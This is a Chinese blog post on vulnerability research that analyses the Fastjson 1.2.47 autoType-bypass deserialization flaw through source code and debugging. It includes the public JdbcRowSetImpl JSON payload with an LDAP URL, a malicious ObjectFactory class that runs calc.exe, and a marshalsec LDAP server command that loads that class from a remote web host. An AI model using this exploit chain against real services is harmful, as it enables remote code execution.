---
title: FastJson历史漏洞研究（二）
tags: web漏洞分析
categories: 技术
top_img: 'https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg'
cover: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/ab6dc70c42e0a86ec0ad3c83f72100e.jpg
date: 2020-09-17 14:29:36
---

<img src="https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.jpg" width="0" height="0" />

前言
----

本文衔接上一篇文章《FastJson历史漏洞研究（一）》，继续探讨一下FastJson的历史漏洞。这次将要介绍的是Fastjson 1.2.47版本存漏洞成因以及其利用方式。

Fastjson 1.2.47漏洞分析
-----------------------

Fastjson 1.2.47版本漏洞与上篇文章中介绍的几处漏洞在原理上有着很大的不同。与Fastjson历史上存在的大多数漏洞不同的是，Fastjson 1.2.47版本的漏洞利用在AutoTypeSupport功能未开启时进行

首先来看一下公开的poc

```java
public class demo {
    public static void main(String[] args) {
        String payload = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}," +
                "\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/ExecTest\",\"autoCommit\":true}}";
        Object obj = JSON.parseObject(payload);
        System.out.println(obj);
    }
}
```



从代码中可见，与以往利用不同的是，该poc中构造了两个json字符串

1、"a":{"\@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}

2、"b":{"\@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://localhost:1389/ExecTest","autoCommit":true}

为了弄清楚这样构造的意义，我们来动态调试一下这个漏洞

程序首先解析第一个json字符串

### "a":{"\@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"} 解析过程

我们跳过部分FastJson解析流程，直接来看checkAutoType安全模块时的操作。对这个字符串中\@type字段进行校验

在位于com/alibaba/fastjson/parser/ParserConfig.java的checkAutoType安全模块中，程序首先进入了这个分支，程序调用getClassFromMapping对typeName进行解析，typeName即为字符串中@type的值，在第一个json字符串中，这个值为"java.lang.Class"

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/2420aa3e444cd8831083d8d5b478abfc.png)

我们跟入位于com/alibaba/fastjson/util/TypeUtils.java 的getClassFromMapping

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/1645767771638713c708e6ea1cccd750.png)

从上图代码可见，程序想从mappings中寻找键名为”java.lang.Class”的元素并返回对应的键值。值得一提的是，mappings集合与后文将要讲到的buckets集合对这个漏洞至关重要，这二者是这个漏洞产生的核心因素

- mappings集合

mappings中存储的数据都是什么呢?经过调试可以发现其中数据形式如下图中所展示

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/1946d987b45c01b2fb8ef2f301f33555.png)

从上图可见，mappings中存储着类名字符串以及对应类对象。然而mappings中的数据又是从何而来的呢？

经过调试发现，mappings中存储的数据是由位于com/alibaba/fastjson/util/TypeUtils.java的addBaseClassMappings方法添加的

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/1c543ae7df2885e45fcfb221acbaec02.png)

从Mapping集合中的数据可以猜测，Mapping是用来存储一些基础的Class，以便于在反序列化处理这些基础类时提高效率

在弄清楚mappings列表的由来后，继续回到正题。我们构造的typeName(@type指定的"java.lang.Class")并不在Mappings的键中。因此getClassFromMapping方法返回null，程序继续向下执行进入下一个if分支。此时程序接着调用deserializers.findClass对传入的typeName进行解析

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/8dd7c917dd26e4b7b91f88e99b3f27b6.png)

我们跟入位于com/alibaba/fastjson/util/IdentityHashMap.java的findClass方法进行进一步分析

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/2f2986a32d56d2b54865f4ebcb9d23f6.png)

从上图代码可见，程序会遍历buckets，取出其中元素的key属性值的名称并与传入的”java.lang.Class”进行比较，如果二者相同，则将这个Class对象返回

- buckets集合

现在我们要谈谈buckets集合了。buckets又存储着什么元素呢？见下图

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/22563478e0b87b0d289cf35117c3231c.png)

上图我们展开了一个buckets集合中元素进行展示。与Mapping集合相同的问题产生了：buckets中的元素都有哪些、他们又从何而来呢？经过调试我们在见下三张图中找到了答案

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/8007c0112c7801da18f86ac3a75e8e6d.png)

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/412c0f522602bd8daf58abf8f69db50b.png)

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/e6b05a79b6d0f0fdadd4cc6d77a4a18a.png)

通过FastJson作者关于buckets集合的注释猜测，buckets是一个用于并发的IdentityHashMap

回到调试流程中findClass方法来，我们构造的typeName(@type指定的"java.lang.Class")被findClass方法匹配到了，因此java.lang.Class类对象被返回

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/82dd20226b88a73b0da0445e9f14e06b.png)

在findClass执行完成后，java.lang.Class类对象被返回到checkAutoType中并赋值给clazz，checkAutoType方法也将于963行处将clazz返回

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/46f06595b7368dd74198ee7d766d7b88.png)

回顾一下上文中的Mapping集合和buckets集合，Fastjson为什么要将用户传入的\@type字段指定的字符串在这两个集合中匹配呢?

Mapping集合则是用来存储基础的Class，如果\@type字段传入的字符串如果对应了基础Class，程序则直接找到其类对象并将其类对象返回，从而跳过了checkAutoType后续的部分校验过程。而buckets集合则是用于并发操作。

但无论Mapping集合与buckets集合实际作用是什么，但凡用户传入的\@type字段字段值在两个集合中任意一个中，且程序使用JSON.parseObject(payload);这样的形式解析字符串(确保expectClass为空，防止进入上图957行if分支)，checkAutoType都将会直接将其对应的Class返回。

checkAutoType在将clazz返回后，程序将会执行到com/alibaba/fastjson/parser/DefaultJSONParser.java中的如下代码

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/b533500e7b23d973fdbc5987b7dcbd46.png)

从上图第一个红框可见，checkAutoType在将用户传入的@type值返回后，程序会赋值给上图316行处clazz变量，而上图384行处的deserialze方法紧接着处理这个clazz变量

跟入位于com/alibaba/fastjson/serializer/MiscCodec.java的deserialze方法中

```java
    public <T> T deserialze(DefaultJSONParser parser, Type clazz, Object fieldName) {
        JSONLexer lexer = parser.lexer;

        ⋮

            if (lexer.token() == JSONToken.LITERAL_STRING) {
                if (!"val".equals(lexer.stringVal())) {
                    throw new JSONException("syntax error");
                }
                lexer.nextToken();
            } else {
                throw new JSONException("syntax error");
            }

            parser.accept(JSONToken.COLON);

            objVal = parser.parse();

            parser.accept(JSONToken.RBRACE);

        ⋮

        if (objVal == null) {
            strVal = null;
        } else if (objVal instanceof String) {
            strVal = (String) objVal;
        } 
        
        ⋮

        if (clazz == Class.class) {
            return (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());
        }
```

此时传入deserialze中clazz变量为checkAutoType安全模块校验后返回的"java.lang.Class"，而fieldName变量值为解析的第一个json字段名"a"

接着来看deserialze方法，在deserialze中与本次漏洞与poc构造的代码块主要有三部分，分别是：

1. 取出json字符串中val值

```java
            if (lexer.token() == JSONToken.LITERAL_STRING) {
                if (!"val".equals(lexer.stringVal())) {
                    throw new JSONException("syntax error");
                }
                lexer.nextToken();
            } else {
                throw new JSONException("syntax error");
            }

            parser.accept(JSONToken.COLON);

            objVal = parser.parse();

            parser.accept(JSONToken.RBRACE);
```

在这段代码中，程序将判断传入的json字符串中是否有”val”,并将其值通过下图第一个红框处的代码取出赋值给objVal变量。

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/47177876b55bd9044eddca76e26b86de.png)

2. 将objVal变量值转换为String类型并赋值strVal变量

```java
        if (objVal == null) {
            strVal = null;
        } else if (objVal instanceof String) {
            strVal = (String) objVal;
        } 
```

这段代码与上一段衔接，objVal变量值又传递给下图第二个红框处。strVal变量判断objVal非空且为String类实例时，将其转换为String类型并赋值与strVal

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/886de67b224f656905c2ffb37cd22001.png)

3. 调用TypeUtils.loadClass处理val值

```java
        if (clazz == Class.class) {
            return (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());
        }
```

这段代码的作用时，当传入的clazz变量为Class的类对象时，调用TypeUtils.loadClass处理strVal(即json字符串中的val值)

在分析完deserialze方法的加工流程后，我们回头看看poc中构造的val值是什么，见下图红框处

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/088df0f5968737cfa586757403329393.png)

poc中构造的是com.sun.rowset.JdbcRowSetImpl字符串，也就是过往漏洞利用中可利用的类。但是根据之前的分析，自从黑名单机制的完善，这个类早已已经不能简单的直接利用了，这个漏洞究竟是如何让这个类绕过黑名单重获新生呢？我们继续往下看看TypeUtils.loadClass中的操作，继续跟入位于com/alibaba/fastjson/util/TypeUtils.java的loadClass

```java
    public static Class<?> loadClass(String className, ClassLoader classLoader, boolean cache) {
        if(className == null || className.length() == 0){
            return null;
        }
        Class<?> clazz = mappings.get(className);
        if(clazz != null){
            return clazz;
        }
        if(className.charAt(0) == '['){
            Class<?> componentType = loadClass(className.substring(1), classLoader);
            return Array.newInstance(componentType, 0).getClass();
        }
        if(className.startsWith("L") && className.endsWith(";")){
            String newClassName = className.substring(1, className.length() - 1);
            return loadClass(newClassName, classLoader);
        }
        try{
            if(classLoader != null){
                clazz = classLoader.loadClass(className);
                if (cache) {
                    mappings.put(className, clazz);
                }
                return clazz;
            }
        } catch(Throwable e){
            e.printStackTrace();
            // skip
        }
        try{
            ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
            if(contextClassLoader != null && contextClassLoader != classLoader){
                clazz = contextClassLoader.loadClass(className);
                if (cache) {
                    mappings.put(className, clazz);
                }
                return clazz;
            }
        } catch(Throwable e){
            // skip
        }
```

loadClass接收的一个参数:"className"为String类型变量，根据上文的调用关系，这里传入的是字符串"com.sun.rowset.JdbcRowSetImpl",即className参数值为"com.sun.rowset.JdbcRowSetImpl"

通过分析loadClass方法代码，可以发现如下代码

```java
        try{
            ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
            if(contextClassLoader != null && contextClassLoader != classLoader){
                clazz = contextClassLoader.loadClass(className);
                if (cache) {
                    mappings.put(className, clazz);
                }
                return clazz;
            }
        }
```

在该代码段中，程序通过contextClassLoader.loadClass(className);方法从字符串类型className变量("com.sun.rowset.JdbcRowSetImpl")获取到com.sun.rowset.JdbcRowSetImpl类对象，并赋值给clazz变量。此时的className、clazz变量形式如下图

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/f4935a82428a0c6642e7509665520283.png)

接着，程序判断cache变量情况：在当cache为true时，将className、clazz键值对加入mappings集合(cache默认为true)。

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/841cfa794636ad9294c1c64afe0c1522.png)

经过动态调试可以发现，通过上面的一系列操作，Mappings集合中确实已经加入了我们的恶意类com.sun.rowset.JdbcRowSetImpl，见下图

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/627c0a9c95e6249cd96f15fcfb201c8c.png)

在我们的第一个json字符串解析完成后，程序随后会解析我们第二个json字符串

### "b":{"\@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://localhost:1389/ExecTest","autoCommit":true}解析过程

与第一个json字符串解析流程完全一致，程序也执行到下图部分

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/24ef953b36ad28dd753484d28f2a5ffb.png)

由于这次Mapping中有键名为com.sun.rowset.JdbcRowSetImpl的元素，因此clazz被赋值为com.sun.rowset.JdbcRowSetImpl类对象

从下面两张图可见，此时上文的流程完全一致，只不过这次返回的时com.sun.rowset.JdbcRowSetImpl类对象

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/a680629fb9e9f50beaff134655281076.png)

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/5918f6f889685868b8888d34093a5b47.png)

com.sun.rowset.JdbcRowSetImpl恶意类被顺利返回，但是整个操作流程中并未触发checkAutoType黑白名单校验机制。随后com.sun.rowset.JdbcRowSetImpl恶意类被反序列化，触发漏洞利用

## 漏洞利用

为了证实漏洞的存在，我们首先在192.167.30.116服务器的80端口web服务上部署ExecTest.class。ExecTest.java中内容如下

```java
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.IOException;
import java.util.Hashtable;

public class ExecTest implements ObjectFactory {

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
        exec("xterm");
        return null;
    }

    public static String exec(String cmd) {
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (IOException e) {
            e.printStackTrace();
        }
        return "";
    }

    public static void main(String[] args) {
        exec("123");
    }
}
```

使用marshalsec开启ladp服务，监听在1389端口

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.167.30.116/java/#ExecTest" 1389
```

![image-20200918145806799](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/image-20200918145806799.png)

demo程序执行完毕，计算器成功弹出

![image-20200918145737798](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/image-20200918145737798.png)